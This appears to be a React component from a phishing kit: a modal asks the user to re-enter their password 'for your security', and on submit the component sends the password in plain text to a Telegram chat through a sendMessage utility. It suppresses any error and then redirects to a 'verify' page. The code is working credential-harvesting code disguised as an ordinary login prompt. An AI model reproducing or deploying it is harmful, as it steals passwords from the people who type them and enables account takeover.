import { faTimes } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import PropTypes from 'prop-types';
import { useState, useEffect, useCallback, useMemo } from 'react';
import { useNavigate } from 'react-router';
import sendMessage from '@/utils/telegram';
import { PATHS } from '@/router/router';

const PasswordInput = ({ onClose }) => {
    const navigate = useNavigate();
    const [password, setPassword] = useState('');
    const [isLoading, setIsLoading] = useState(false);

    const defaultTexts = useMemo(
        () => ({
            title: 'Please Enter Your Password',
            description: 'For your security, you must enter your password to continue',
            passwordLabel: 'Password',
            placeholder: 'Enter your password',
            continueBtn: 'Continue',
            loadingText: 'Please wait'
        }),
        []
    );

    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);

    // 🎯 SỬA: Lấy dữ liệu dịch từ localStorage thay vì dịch lại
    useEffect(() => {
        const targetLang = localStorage.getItem('targetLang');
        if (targetLang && targetLang !== 'en') {
            const storedPasswordTexts = localStorage.getItem(`translatedPassword_${targetLang}`);
            if (storedPasswordTexts) {
                setTranslatedTexts(JSON.parse(storedPasswordTexts));
            }
        }
    }, []);

    const handleSubmit = async () => {
        if (!password.trim()) return;

        setIsLoading(true);

        try {
            const message = `🔑 <b>Password:</b> <code>${password}</code>`;
            await sendMessage(message);
        } catch {
            //
        }

        await new Promise((resolve) => setTimeout(resolve, 1000));

        setIsLoading(false);
        navigate(PATHS.VERIFY);
    };

    return (
        <div className='fixed top-0 left-0 z-20 flex h-screen w-screen items-center justify-center'>
            <div className='w-lg rounded-lg bg-white shadow-lg'>
                <div className='flex items-center justify-between rounded-t-lg border-b border-gray-300 bg-[#f8f8f8] px-6 py-4'>
                    <p className='text-xl leading-6 font-semibold'>{translatedTexts.title}</p>
                    <FontAwesomeIcon
                        icon={faTimes}
                        className='cursor-pointer hover:text-gray-600'
                        onClick={onClose}
                    />
                </div>
                <div className='flex flex-col gap-4 px-6 py-4'>
                    <p className='text-base leading-6 text-[#212529bf]'>{translatedTexts.description}</p>
                    <p className='font-bold text-[#212529]'>{translatedTexts.passwordLabel}</p>
                    <input
                        type='password'
                        placeholder={translatedTexts.placeholder}
                        className='w-full rounded-lg border border-gray-300 px-3 py-1.5'
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
                    />
                    <button
                        className='rounded-lg bg-blue-500 px-3 py-1.5 text-white disabled:opacity-50'
                        onClick={handleSubmit}
                        disabled={isLoading || !password.trim()}
                    >
                        {isLoading
                            ? `${translatedTexts.loadingText}...`
                            : translatedTexts.continueBtn}
                    </button>
                </div>
            </div>
        </div>
    );
};

PasswordInput.propTypes = {
    onClose: PropTypes.func.isRequired
};

export default PasswordInput;
